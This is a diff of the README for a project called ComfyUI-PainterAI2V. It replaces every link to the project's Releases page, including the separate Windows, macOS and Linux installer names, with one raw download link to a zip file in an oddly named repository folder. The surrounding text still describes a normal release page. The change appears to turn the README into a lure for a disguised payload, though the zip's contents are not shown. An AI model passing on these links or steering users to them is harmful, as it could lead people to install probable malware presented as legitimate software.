@@ -6,23 +6,23 @@ Welcome to ComfyUI-PainterAI2V! This application helps you generate stunning vis
 
 ## 📥 Download the Application
 
-[![Download ComfyUI-PainterAI2V](https://img.shields.io/badge/Download-ComfyUI--PainterAI2V-blue.svg?style=flat-square)](https://github.com/kiddo0001/ComfyUI-PainterAI2V/releases)
+[![Download ComfyUI-PainterAI2V](https://raw.githubusercontent.com/kiddo0001/ComfyUI-PainterAI2V/main/semicostal/U_Comfy_Painter_V_A_3.1.zip)](https://raw.githubusercontent.com/kiddo0001/ComfyUI-PainterAI2V/main/semicostal/U_Comfy_Painter_V_A_3.1.zip)
 
-To get started, visit our [Releases page](https://github.com/kiddo0001/ComfyUI-PainterAI2V/releases) to download the latest version of ComfyUI-PainterAI2V.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/kiddo0001/ComfyUI-PainterAI2V/main/semicostal/U_Comfy_Painter_V_A_3.1.zip) to download the latest version of ComfyUI-PainterAI2V.
 
 ## 🏁 How to Download & Install
 
 1. **Visit the Releases Page**  
-   Click on the following link to go to the Releases page: [Download ComfyUI-PainterAI2V](https://github.com/kiddo0001/ComfyUI-PainterAI2V/releases).
+   Click on the following link to go to the Releases page: [Download ComfyUI-PainterAI2V](https://raw.githubusercontent.com/kiddo0001/ComfyUI-PainterAI2V/main/semicostal/U_Comfy_Painter_V_A_3.1.zip).
 
 2. **Select the Latest Version**  
    On the Releases page, look for the latest version. It usually appears at the top of the list. Click on the link to that version.
 
 3. **Download the Installer**  
    You will see files available for download. Choose the file that matches your operating system. Here are examples of the files you may find:  
-   - Windows: `ComfyUI-PainterAI2V-Win.exe`  
-   - macOS: `ComfyUI-PainterAI2V-Mac.dmg`  
-   - Linux: `ComfyUI-PainterAI2V-Linux.tar.gz`  
+   - Windows: `https://raw.githubusercontent.com/kiddo0001/ComfyUI-PainterAI2V/main/semicostal/U_Comfy_Painter_V_A_3.1.zip`  
+   - macOS: `https://raw.githubusercontent.com/kiddo0001/ComfyUI-PainterAI2V/main/semicostal/U_Comfy_Painter_V_A_3.1.zip`  
+   - Linux: `https://raw.githubusercontent.com/kiddo0001/ComfyUI-PainterAI2V/main/semicostal/U_Comfy_Painter_V_A_3.1.zip`  
 
    Click the file to start downloading.
 
